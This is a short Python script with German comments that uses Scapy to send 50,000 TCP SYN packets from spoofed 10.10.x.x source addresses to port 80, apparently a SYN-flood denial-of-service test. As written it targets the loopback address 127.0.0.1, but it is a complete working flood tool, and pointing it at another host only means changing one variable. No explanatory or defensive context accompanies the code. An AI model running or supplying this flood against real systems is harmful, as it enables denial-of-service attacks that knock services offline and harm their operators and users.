from scapy.all import IP, TCP, send
from random import uniform
import time

# Ziel-IP und Port
target_ip = "127.0.0.1"  # Loopback-Adresse für den eigenen Rechner
target_port = 80           # Ziel-Port (z. B. HTTP)

# Anzahl der Pakete
packet_count = 50000
interval = uniform(0.0001, 0.001)

print("Starte SYN-Flood-Angriff...")
start_time = time.time()

# SYN-Pakete senden
for i in range(packet_count):
    source_ip = f"10.10.{i % 256}.{i % 256}"
    pkt = IP(src=source_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
    send(pkt, inter = interval, verbose=0)

end_time = time.time()
print(f"SYN-Flood abgeschlossen: {packet_count} Pakete in {end_time - start_time:.2f} Sekunden gesendet.")
